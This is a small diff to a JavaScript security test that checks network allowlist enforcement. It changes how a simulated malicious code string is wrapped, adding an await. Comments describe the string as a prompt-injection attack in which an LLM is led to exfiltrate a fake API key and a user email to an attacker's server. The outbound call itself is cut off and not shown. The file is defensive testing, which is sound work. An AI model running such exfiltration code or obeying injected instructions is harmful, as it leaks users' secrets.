@@ -71,9 +71,9 @@ describe('Security: Network Allowlist Enforcement', () => {
 
       // Simulate prompt injection attack: malicious code tries to exfiltrate data
       // This represents an attacker convincing the LLM to fetch external data
-      // Wrap in async IIFE to ensure all errors are caught
+      // Wrap in async IIFE and await to ensure all errors are caught
       const maliciousCode = `
-        (async () => {
+        await (async () => {
           // ATTACK: Prompt injection attempting to exfiltrate data to attacker's server
           const sensitiveData = { secret: 'STOLEN_API_KEY_12345', user: 'victim@example.com' };
           
